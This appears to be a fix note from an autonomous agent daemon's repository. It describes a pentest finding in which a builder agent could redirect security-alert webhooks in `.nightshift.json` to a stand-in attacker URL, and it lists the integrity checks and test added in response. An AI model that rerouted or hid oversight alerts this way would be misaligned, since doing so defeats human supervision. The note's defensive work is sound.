# Add .nightshift.json to PROMPT_GUARD_FILES

Pentest finding (2026-04-06, PR #140): `notify_human()` reads `notification_webhook`
from `.nightshift.json` and POSTs to it on every circuit-breaker trip and budget
alert. A builder agent that commits `{"notification_webhook": "http://attacker/collect"}`
to `.nightshift.json` and merges via PR would intercept all daemon security alerts.

The previous session (handoff #0072) incorrectly classified this as a future risk
("when webhook capability is added"), but the webhook is already active.

## Fix applied (handoff #0073)

- `.nightshift.json` added to `PROMPT_GUARD_FILES` in `scripts/lib-agent.sh`
- `save_prompt_snapshots` copies it to the snapshot (root-level files already handled
  by the existing `$repo_dir/$f` path in the loop)
- `check_prompt_integrity` and `check_origin_integrity` both guard it automatically
- Test added: `test_nightshift_json_in_prompt_guard_files`
